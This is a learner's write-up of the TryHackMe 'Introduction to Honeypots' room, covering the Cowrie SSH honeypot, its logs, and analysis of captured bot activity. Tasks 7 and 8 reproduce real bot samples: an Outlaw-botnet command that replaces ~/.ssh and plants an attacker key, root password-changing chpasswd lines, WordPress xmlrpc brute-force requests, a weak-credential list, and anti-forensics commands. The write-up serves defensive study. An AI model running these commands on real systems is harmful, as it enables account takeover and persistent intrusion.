<h1 align="center">Introduction to Honeypots</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/2ca609ea-ed3e-47a1-985b-84463e98cf00"><br>
2025, September 25<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>507</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>A guided room covering the deployment of honeypots and analysis of botnet activities</em>.<br>
Access it <a href="https://tryhackme.com/room/introductiontohoneypots">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/ee385078-58ea-4767-aea2-bc28d6b39590"></p>

<h2 align="center">Task 1 . Introduction</h2>
<h3 align="center">What is a honeypot?</h3>
<p>A honeypot is a deliberately vulnerable security tool designed to attract attackers and record the actions of adversaries. Honeypots can be used in a defensive role to alert administrators of potential breaches and to distract attackers away from real infrastructure. Honeypots are also used to collect data on the tools and techniques of adversaries and assist with generating effective defensive measures.<br>

This room will demonstrate the Cowrie honeypot from the perspectives of an adversary and security researcher. This room will also highlight the data collected by a Cowrie honeypot deployment, some analysis methodologies, and what the gathered data tell us about typical botnet activity.</p>

<p><em>Answer the question below</em></p>

<p>1.1. Deploy the demo machine<br>
<code>No answer needed</code></p>

<h2 align="center">Task 2 . Types of Honeypots</h2>
<h3 align="center">Honeyport Interactivity and Classification</h3>
<p>A wide variety of honeypots exist so it is helpful to classify them by the level of interactivity provided to adversaries, with most honeypots falling into one of the below categories:<br>

- Low-Interaction honeypots offer little interactivity to the adversary and are only capable of simulating the functions that are required to simulate a service and capture attacks against it. Adversaries are not able to perform any post-exploitation activity against these honeypots as they are unable to fully exploit the simulated service. Examples of low-interaction honeypots include mailoney and dionaea.<br>
- Medium-Interaction honeypots collect data by emulating both vulnerable services as well as the underlying OS, shell, and file systems. This allows adversaries to complete initial exploits and carry out post-exploitation activity. Note, that unlike, High-Interaction honeypots (see below), the system presented to adversaries is a simulation. As a result, it is usually not possible for adversaries to complete their full range of post-exploitation activity as the simulation will be unable to function completely or accurately. We will be taking a look at the medium-interaction SSH honeypot, Cowrie in this demo.<br>
- High-Interaction honeypots are fully complete systems that are usually Virtual Machines that include deliberate vulnerabilities. Adversaries should be able (but not necessarily allowed) to perform any action against the honeypot as it is a complete system. It is important that high-interaction honeypots are carefully managed, otherwise, there is a risk that an adversary could use the honeypot as a foothold to attack other resources. Cowrie can also operate as an SSH proxy and management system for high-interaction honeypots.</p>

<h3 align="center">Deployment Location</h3>
<p>Once deployed, honeypots can then be further categorized by the exact location of their deployment:<br>

- Internal honeypots are deployed inside a LAN. This type can act as a way to monitor a network for threats originating from the inside, for example, attacks originating from trusted personnel or attacks that by-parse firewalls like phishing attacks. Ideally, these honeypots should never be compromised as this would indicate a significant breach.<br>
- External honeypots are deployed on the open internet and are used to monitor attacks from outside of the LAN. These honeypots are able to collect much more data on attacks since they are effectively guaranteed to be under attack at all times.</p>

<p><em>Answer the question below</em></p>

<p>2.1. Read and understand the above.<br>
<code>No answer needed</code></p>

<h2 align="center">Task 3 . Cowrie Demo</h2>
<h3 align="center">The Cowrie SSH Honeypot</h3>
<p>The Cowrie honeypot can work both as an SSH proxy or as a simulated shell. The demo machine is running the simulated shell. You can log in using the following credentials:<br>

- IP - xx.xxx.xxx.xx<br>
- User - root<br>
- Password - ANY<br><br>
As you can see the emulated shell is pretty convincing and could catch an unprepared adversary off guard. Most of the commands work like how you'd expect, and the contents of the file system match what would be present on an empty Ubuntu 18.04 installation. However, there are ways to identify this type of Cowrie deployment. For example, it's not possible to execute bash scripts as this is a limitation of low and medium interaction honeypots. It's also possible to identify the default installation as it will mirror a Debian 5 Installation and features a user account named Phil. The default file system also references an outdated CPU.</p>

<p><em>Answer the questions below</em></p>

<p>3.1. Try running some commands in the honeypot<br>
<code>No answer needed</code></p>

<p>3.2. Create a file and then log back in is the file still there? (Yay/Nay)<br>
<code>Nay</code></p>


```bash
:~/IntroductionToHoneyPots# nmap -sC -sV -p- -T4 xx.xxx.xxx.xx
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.9 (protocol 2.0)
| ssh-hostkey: 
...
1400/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
```

```bash
:~/IntroductionToHoneyPots# ssh root@xx.xxx.xxx.xx
The authenticity of host 'xx.xxx.xxx.xx (xx.xxx.xxx.xx)' can't be established.
RSA key fingerprint is SHA256:...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'xx.xxx.xxx.xx' (RSA) to the list of known hosts.
Ubuntu 18.04.5 LTS
root@1xx.xxx.xxx.xx's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@acmeweb:~# echo 'hello' > hello.txt
root@acmeweb:~# ls
hello.txt 
root@acmeweb:~# exit
Connection to xx.xxx.xxx.xx closed.
```

```bash
:~/IntroductionToHoneyPots# ssh root@xx.xxx.xxx.xx
Ubuntu 18.04.5 LTS
root@xx.xxx.xxx.xx's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@acmeweb:~# ls
root@acmeweb:~# 
```

<h2 align="center">Task 4 . Cowrie Logs</h2>
<h3 align="center">Cowrie Event Logging</h3>
<p>The honeypot wouldn't be of much use without the ability to collect data on the attacks that it's subjected to. Fortunately, Cowrie uses an extensive logging system that tracks every connection and command handled by the system. You can access the real SSH port for this demo machine using the following options:

- IP - xx.xxx.xxx.xx<br>
- Port - 1400<br>
- User - demo<br>
- Password - demo<br><br>


Cowrie can log to a variety of different local formats and log parsing suites. In this case, the installation is just using the JSON and text logs. I've installed the JSON parser jq on the demo machine to simplify log parsing.<br><br>

Note: You may need to delete the demo machine's identity from .ssh/known_hosts as it will differ from the one used in the honeypot. You will also need to specify a port adding -p 1400 to the SSH command. The logs will also be found at /home/cowrie/honeypot/var/log/cowrie

<h3 align="center">Log Aggregation</h3>
<p>The amount of data collected by honeypots, especially external deployments can quickly exceed the point where it's no longer practical to parse manually. As a result, it's often worth deploying Honeypots alongside a logging platform like the ELK stack. Log aggregation platforms can also provide live monitoring capabilities and alerts. This is particularly beneficial when deploying Honeypots, with the intent to respond to attacks rather than to collect data.</p>

<p><em>Answer the question below</em></p>

<p>4.1. Have a look through the logs and see how the activity from the last task has been recorded by the system.<br>
<code>No answer needed</code></p>

```bash
:~/IntroductionToHoneyPots# ssh demo@xx.xxx.xxx.xx -p 1400
...
demo@ip-xx-xxx-xxx-xx:~$ whoami
demo
demo@ip-xx-xxx-xxx-xx:~$ id
uid=1001(demo) gid=1001(demo) groups=1001(demo)
demo@ip-xx-xxx-xxx-xx:~$ pwd
/home/demo
demo@ip-xx-xxx-xxx-xx:/home/cowrie/honeypot/var/log/cowrie$ ls
audit.log  cowrie.json  cowrie.json.2021-09-23  cowrie.json.2025-04-27
demo@ip-xx-xxx-xxx-xx:/home/cowrie/honeypot/var/log/cowrie$ head -n 5 audit.log
...
demo@ip-xx-xxx-xxx-xx:/home/cowrie/honeypot/var/log/cowrie$ tail -n 5 audit.log
```

<img width="1238" height="325" alt="image" src="https://github.com/user-attachments/assets/f122e1bd-8ac8-4eb2-a1b3-14e6b910aa7c" />

<br>
<br>
<h2 align="center">Task 5 . Attacks Against SSH</h2>
<h3 align="center">SSH and Brute-Force Attacks</h3>
<p>By default, Cowrie will only expose SSH. This means adversaries will only be able to compromise the honeypot by attacking the SSH service. The attack surface presented by a typical SSH installation is limited so most attacks against the service will take the form of brute-force attacks. Defending against these attacks is relatively simple in most cases as they can be defeated by only allowing public-key authentication or by using strong passwords. These attacks should not be completely ignored, as there are simply so many of them that you are pretty much guaranteed to be attacked at some point.<br>

A collection of the 200 most common credentials used against old Cowrie deployments has been left on the demo machine and can be used to answer the questions below. As you can see, most of the passwords are extremely weak. Notable entries include the default credentials used for some devices like Raspberry PIs and the Volumio Jukebox. Various combinations of '1234' and rows of keys are also commonplace.</p>

<p><em>Answer the questions below</em></p>

<p>5.1. How many passwords include the word "password" or some other variation of it e.g "p@ssw0rd"<br>
<code>15</code></p>

```bash
demo@ip-xx-xxx-xxx-xx:/home/cowrie/honeypot/var/log/cowrie$ find / -type f -name "*reds.txt" 2>/dev/null
/home/demo/Top200Creds.txt
```

<img width="1237" height="76" alt="image" src="https://github.com/user-attachments/assets/65a35a36-c3ef-4708-bd54-00a52332588e" />

<br>
<br>

```bash
demo@ip-xx-xxx-xxx-xx:~$ h:~$ ls
BotCommands  Top200Creds.txt  Tunnelling
```

```bash
demo@ip-xx-xxx-xxx-xx:/home/cowrie/honeypot/var/log/cowrie$ head -n 5 /home/demo/Top200Creds.txt
/root/1234/
/root/gm8182/
/root/admin/
/root/1/
/user/1/
```

```bash
demo@ip-xx-xxx-xxx-xx:~$ grep "p.*ssw.*" Top200Creds.txt | wc -l
15
```

<p>

- MicroTik</p>

```bash
demo@ip-xx-xxx-xxx-xx:~$ grep "p.*ssw.*" Top200Creds.txt
/admin/password/
/root/password1/
/root/password/
/user1/password/
/MikroTik/password/
/default/password/
/admin1/password/
/profile1/password/
/user/password/
/admin/passw0rd/
/admin1/passw0rd/
/user1/passw0rd/
/profile1/passw0rd/
/MikroTik/passw0rd/
/default/passw0rd/
```

<img width="1113" height="304" alt="image" src="https://github.com/user-attachments/assets/7ba1a828-cf5d-4515-9ce2-d3c0a51abdab" />

<br>
<br>

<p>5.2. What is arguably the most common tool for brute-forcing SSH?<br>
<code>hydra</code></p>

<br>
<p>5.3.  What intrusion prevention software framework is commonly used to mitigate SSH brute-force attacks?<br>
<code>Fail2Ban</code></p>

<h2 align="center">Task 6 . Typical Bot Activity</h2>
<h3 align="center">SSH and Brute-Force Attacks</h3>
<p>The majority of attacks against typical SSH deployments are automated in some way. As a result, most of the post-exploitation activity that takes place after a bot gains initial access to the honeypot will follow a broad pattern. In general, most bots will perform a combination of the following:<br>

- Perform some reconnaissance using the uname or nproc commands or by reading the contents of files like /etc/issue and /proc/cpuinfo. It's possible to change the contents of all these files so the honeypot can pretend to be a server or even an IoT toaster.<br>
- Install malicious software by piping a remote shell script into bash. Often this is performed using wget or curl though, bots will occasionally use FTP. Cowrie will download each unique occurrence of a file but prevent the scripts from being executed. Most of the scripts tend to reference cryptocurrency mining in some way.<br>
- A more limited number of bots will then perform some anti-forensics tasks by deleting various logs and disabling bash history. This doesn't affect Cowrie since all the actions are logged externally.<br><br>
Bots are not limited to these actions in any way and there is still some variation in the methods and goals of bots. Run through the questions below to further understand how adversaries typically perform reconnaissance against Linux systems.</p>


<p><em>Answer the questions below</em></p>

<p>6.1. What's the full model name of CPU does the honeypot "use"?<br>
<code>   </code></p>
<p>

- uname -a
- /etc/issue = Ubuntu 20.04.6 LTS<br>
- /et5c/cpuinfo = omodel name	: AMD EPYC 7571</p>

```bash
root@acmeweb:~# uname
Linux ip-xx-xxx-xx-xx 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
Linux
root@acmeweb:~# uname -a
Linux acmeweb 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux
root@acmeweb:~# cat /proc/cpuinfo
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
model		: 23
model name	: Intel(R) Core(TM) i9-11900KB CPU @ 3.30GHz
stepping	: 6
cpu MHz		: 2133.304
cache size	: 6144 KB
physical id	: 0
siblings	: 2
core id		: 0
cpu cores	: 8
apicid		: 0
initial apicid	: 0
fpu		: yes
fpu_exception	: yes
cpuid level	: 10
wp		: yes
flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
bogomips	: 4270.03
clflush size	: 64
cache_alignment	: 64
address sizes	: 36 bits physical, 48 bits virtual
power management:

processor	: 1
vendor_id	: GenuineIntel
cpu family	: 6
model		: 23
model name	: Intel(R) Core(TM) i9-11900KB CPU @ 3.30GHz
stepping	: 6
cpu MHz		: 2133.304
cache size	: 6144 KB
physical id	: 0
siblings	: 2
core id		: 1
cpu cores	: 8
apicid		: 1
initial apicid	: 1
fpu		: yes
fpu_exception	: yes
cpuid level	: 10
wp		: yes
flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
bogomips	: 4266.61
clflush size	: 64
cache_alignment	: 64
address sizes	: 36 bits physical, 48 bits virtual
power management:
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
model		: 23
model name	: Intel(R) Core(TM) i9-11900KB CPU @ 3.30GHz
stepping	: 6
cpu MHz		: 2133.304
cache size	: 6144 KB
physical id	: 0
siblings	: 2
core id		: 0
cpu cores	: 8
apicid		: 0
initial apicid	: 0
fpu		: yes
fpu_exception	: yes
cpuid level	: 10
wp		: yes
flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
bogomips	: 4270.03
clflush size	: 64
cache_alignment	: 64
address sizes	: 36 bits physical, 48 bits virtual
power management:

processor	: 1
vendor_id	: GenuineIntel
cpu family	: 6
model		: 23
model name	: Intel(R) Core(TM) i9-11900KB CPU @ 3.30GHz
stepping	: 6
cpu MHz		: 2133.304
cache size	: 6144 KB
physical id	: 0
siblings	: 2
core id		: 1
cpu cores	: 8
apicid		: 1
initial apicid	: 1
fpu		: yes
fpu_exception	: yes
cpuid level	: 10
wp		: yes
flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
bogomips	: 4266.61
clflush size	: 64
cache_alignment	: 64
address sizes	: 36 bits physical, 48 bits virtual
power management:
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
model		: 23
model name	: Intel(R) Core(TM) i9-11900KB CPU @ 3.30GHz
stepping	: 6
cpu MHz		: 2133.304
cache size	: 6144 KB
physical id	: 0
siblings	: 2
core id		: 0
cpu cores	: 8
apicid		: 0
initial apicid	: 0
fpu		: yes
fpu_exception	: yes
cpuid level	: 10
wp		: yes
flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
bogomips	: 4270.03
clflush size	: 64
cache_alignment	: 64
address sizes	: 36 bits physical, 48 bits virtual
power management:

processor	: 1
vendor_id	: GenuineIntel
cpu family	: 6
model		: 23
model name	: Intel(R) Core(TM) i9-11900KB CPU @ 3.30GHz
stepping	: 6
cpu MHz		: 2133.304
cache size	: 6144 KB
physical id	: 0
siblings	: 2
core id		: 1
cpu cores	: 8
apicid		: 1
initial apicid	: 1
fpu		: yes
fpu_exception	: yes
cpuid level	: 10
wp		: yes
flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
bogomips	: 4266.61
clflush size	: 64
cache_alignment	: 64
address sizes	: 36 bits physical, 48 bits virtual
power management:
```

<p>6.2. Does the honeypot return the correct values when uname -a is run? (Yay/Nay)<br>
<code>Nay</code></p>

<br>
<p>6.3. What flag must be set to pipe wget output into bash?br>
<code>-O</code></p>

<img width="1114" height="178" alt="image" src="https://github.com/user-attachments/assets/326044d8-6939-4274-b261-9f940d0b5c7d" />

<br>
<br>
<p>6.4. How would you disable bash history using unset?br>
<code>unset HISTFILE</code></p>

<p>

- https://www.cyberciti.biz/faq/disable-bash-shell-history-linux/#:~:text=How%20to%20permanently%20disable%20bash%20history%20using%20set%20command&text=Again%20add%20set%20%2Bo%20history,history.</p>

<img width="1092" height="207" alt="image" src="https://github.com/user-attachments/assets/ea629819-5453-4c02-a018-65bac3d01184" />

<br>
<br>
<h2 align="center">Task 7 . identification Techniques</h2>
<h3 align="center">Bot Identifiction</h3>
<p>It is possible to use the data recorded by Cowrie to identify individual bots. The factors that can identify traffic from individual botnets are not always the same. However, some artifacts tend to be consistent across bots including, the IP addresses requested by bots and the specific order of commands. Identifiable messages may also be present in scripts or commands though this is uncommon. Some bots may also use highly identifiable public SSH keys to maintain persistence.<br>

It's also possible to identify bots from the scripts that are downloaded by the honeypot, using the same methods that would be used to identify other malware samples.<br>

Take a look at the samples included with the demo machine and answer the below questions.<br>

Note: Don't run any of the commands found in the samples as you may end up compromising whatever machine that runs them!</p>

<p><em>Answer the questions below</em></p>

<p>7.1. What brand of device is the bot in the first sample searching for? (BotCommands/Sample1.txt)<br>
<code>Mikrotik</code></p>

```bash
demo@ip-xx-xxx-xxx-xx:~/BotCommands$ ll
total 20
drwxr-xr-x 2 cowrie cowrie 4096 Jun 25  2021 ./
drwxr-xr-x 4 cowrie cowrie 4096 Sep 23  2021 ../
-rw-r--r-- 1 cowrie cowrie  240 Jun 25  2021 Sample1.txt
-rw-r--r-- 1 cowrie cowrie  696 Jun 25  2021 Sample2.txt
-rw-r--r-- 1 cowrie cowrie  791 Jun 25  2021 Sample3.txt
```

```bash
demo@ip-xx-xxx-xxx-xx:~/BotCommands$ cat Sample1.txt
ps | grep '[Mm]iner'
ps -ef | grep '[Mm]iner'
ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
echo Hi | cat -n
```

<p>

- https://malwaremily.medium.com/honeypot-logs-a-botnets-search-for-mikrotik-routers-48e69e110e52</p>

<img width="931" height="254" alt="image" src="https://github.com/user-attachments/assets/33eb20b1-778d-417d-9ec6-a19a597a8743" />

<br>
<br>

<p>7.2. What are the commands in the second sample changing? (BotCommands/Sample2.txt)<br>
<code>root password</code></p>

```bash
demo@ip-xx-xxx-xxx-xx:~/BotCommands$ cat Sample2.txt
echo \"root:ZyTROnKtNOB5\"|chpasswd|bash
echo \"root:zXrUYeQRom1F\"|chpasswd|bash
echo \"root:zXkEkfPSWgYK\"|chpasswd|bash
echo \"root:ZW6ERACumXAi\"|chpasswd|bash
echo \"root:ZVricgmpalNQ\"|chpasswd|bash
echo \"root:zvMK5KIUoJXN\"|chpasswd|bash
echo \"root:zTQ9UvZjszlp\"|chpasswd|bash
echo \"root:ZtPueNEWiBuJ\"|chpasswd|bash
echo \"root:ZTgx8J14ryr4\"|chpasswd|bash
echo \"root:ZSVzpwnxv1Vw\"|chpasswd|bash
echo \"root:ZsVuhtOpy5GZ\"|chpasswd|bash
echo \"root:zSK4VEwVn2a1\"|chpasswd|bash
echo \"root:zReLZCuFqwQq\"|chpasswd|bash
echo \"root:zqqNt9wDjoY0\"|chpasswd|bash
echo \"root:zp8aWkWSBJpR\"|chpasswd|bash
echo \"root:zOaUrTVAijNT\"|chpasswd|bash
echo \"root:znTmaDamJytL\"|chpasswd|bash
```

<p>7.3. What is the name of the group that runs the botnet in the third sample? (BotCommands/Sample3.txt)<br>
<code>outlaw</code></p>

```bash
demo@ip-xx-xxx-xxx-xx:~/BotCommands$ cat Sample3.txt
which ls
w
uname -m
uname
top
ls -lh $(which ls)
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
crontab -l
cat /proc/cpuinfo | grep name | wc -l
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
cat /proc/cpuinfo | grep model | grep name | wc -l
lscpu | grep Model
cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAA...kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```

<p>

- https://securelist.com/outlaw-botnet/116444/</p>

<img width="995" height="299" alt="image" src="https://github.com/user-attachments/assets/72241805-8a5c-43fa-96be-94404c90805b" />

<br>
<br>
<h2 align="center">Task 8 . SSH Tunnelling</h2>
<h3 align="center">Attacks Performed Using SSH Tunnelling</h3>
<p>Some bots will not perform any actions directly against honeypot and instead will leverage a compromised SSH deployment itself. This is accomplished with the use of SSH tunnels. In short, SSH tunnels forward network traffic between nodes via an encrypted tunnel. SSH tunnels can then add an additional layer of secrecy when attacking other targets as third parties are unable to see the contents of packets that are forwarded through the tunnel. Forwarding via SSH tunnels also allows an adversary to hide their true public IP in much the same way a VPN would.<br>

The IP obfuscation can then be used to facilitate schemes that require the use of multiple different public IP addresses like, SEO boosting and spamming. SSH tunnelling may also be used to by-parse IP-based rate limiting tools like Fail2Ban as an adversary is able to transfer to a different IP once they have been blocked.</p>


<h3 align="center">SSH Tunnelling Data in Cowrie</h3>
<p>By default, Cowrie will record all of the SSH tunnelling requests received by the honeypot but, will not forward them on to their destination. This data is of particular importance as it allows for the monitoring and discovery of web attacks, that may not have been found by another honeypot. I've included a couple of samples sort of data that can be recorded from SSH tunnels.<br>

Note: Some elements have been redacted from the samples to protect vulnerable servers.</p>

<p><em>Answer the questions below</em></p>

<p>7.1. What application is being targetted in the first sample? (Tunnelling/Sample1.txt)<br>
<code>WordPress</code></p>


```bash
demo@ip-xx-xxx-xxx-xx:~/Tunnelling$ ll
total 16
drwxr-xr-x 2 cowrie cowrie 4096 Jun 29  2021 ./
drwxr-xr-x 4 cowrie cowrie 4096 Sep 23  2021 ../
-rw-r--r-- 1 cowrie cowrie 1794 Jun 25  2021 Sample1.txt
-rw-r--r-- 1 cowrie cowrie 3811 Jun 25  2021 Sample2.txt
```

<p>

- wp.getUsersBlogs<br>
- wp = WordPress</p>

```bash
demo@ip-xx-xxx-xxx-xx:~/Tunnelling$ cat Sample1.txt
2021-03-17T10:09:51.052837Z [SSHChannel cowrie-discarded-direct-tcpip (62) on SSHService b'ssh-connection' on HoneyPotSSHTransport,118939,0.0.0.0] discarded direct-tcp forward request 62 to <A DOMAIN>:80 with data b'POST demo@ip-xx-xxx-xxx-xx:~/Tunnelling$ HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: keep-alive\r\nContent-Length: 201\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: <A DOMAIN>\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password11\r</value></param></params></methodCall>'
2021-03-17T09:19:13.162315Z [SSHChannel cowrie-discarded-direct-tcpip (95) on SSHService b'ssh-connection' on HoneyPotSSHTransport,117811,0.0.0.0] discarded direct-tcp forward request 95 to <A DOMAIN>:80 with data b'POST /xmlrpc.php HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: keep-alive\r\nContent-Length: 203\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: <A DOMAIN>\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin1</value></param><param><value>password1\r</value></param></params></methodCall>'
```

<p>

- https://www.invicti.com/blog/web-security/xml-rpc-protocol-ip-disclosure-attacks/#:~:text=Using%20XML%2DRPC%2C%20WordPress%20developers,platforms%2C%20such%20as%20mobile%20phones.</p>

<img width="917" height="291" alt="image" src="https://github.com/user-attachments/assets/dbafea2f-a95f-4bb6-ab12-6404689cfc85" />


<br>
<br>
<p>7.2. Is the URL in the second sample malicious? (Tunnelling/Sample2.txt) (Yay/Nay)<br>
<code>Nay</code></p>

```bash
demo@ip-xx-xxx-xxx-xx:~/Tunnelling$ cat Sample2.txt
2021-03-12T09:40:34.961411Z [SSHChannel cowrie-discarded-direct-tcpip (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,7343,0.0.0.0] discarded direct-tcp forward request 0 to ip-api.com:80 with data b'GET /json HTTP/1.1\r\nHost: ip-api.com\r\nConnection: keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0\r\n\r\n'
2021-03-12T09:45:35.937278Z [SSHChannel cowrie-discarded-direct-tcpip (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,7396,0.0.0.0] discarded direct-tcp forward request 0 to ip-api.com:80 with data b'GET /json HTTP/1.1\r\nHost: ip-api.com\r\nConnection: keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; rv:85.0) Gecko/20100101 Firefox/86.0\r\n\r\n'
2021-03-12T09:50:37.329291Z [SSHChannel cowrie-discarded-direct-tcpip (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,7464,0.0.0.0] discarded direct-tcp forward request 0 to ip-api.com:80 with data b'GET /json HTTP/1.1\r\nHost: ip-api.com\r\nConnection: keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:86.0) Gecko/20100101 Firefox/86.0\r\n\r\n'
2021-03-12T09:55:37.756042Z [SSHChannel cowrie-discarded-direct-tcpip (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,7534,0.0.0.0] discarded direct-tcp forward request 0 to ip-api.com:80 with data b'GET /json HTTP/1.1\r\nHost: ip-api.com\r\nConnection: keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36\r\n\r\n'
2021-03-12T10:00:38.504759Z [SSHChannel cowrie-discarded-direct-tcpip (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,7611,0.0.0.0] discarded direct-tcp forward request 1 to ip-api.com:80 with data b'GET /json HTTP/1.1\r\nHost: ip-api.com\r\nConnection: keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:85.0) Gecko/20100101 Firefox/86.0\r\n\r\n'
2021-03-12T10:05:38.538543Z [SSHChannel cowrie-discarded-direct-tcpip (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,7670,0.0.0.0] discarded direct-tcp forward request 1 to ip-api.com:80 with data b'GET /json HTTP/1.1\r\nHost: ip-api.com\r\nConnection: keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36\r\n\r\n'
2021-03-12T10:10:39.389895Z [SSHChannel cowrie-discarded-direct-tcpip (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,7785,0.0.0.0] discarded direct-tcp forward request 0 to ip-api.com:80 with data b'GET /json HTTP/1.1\r\nHost: ip-api.com\r\nConnection: keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36\r\n\r\n'
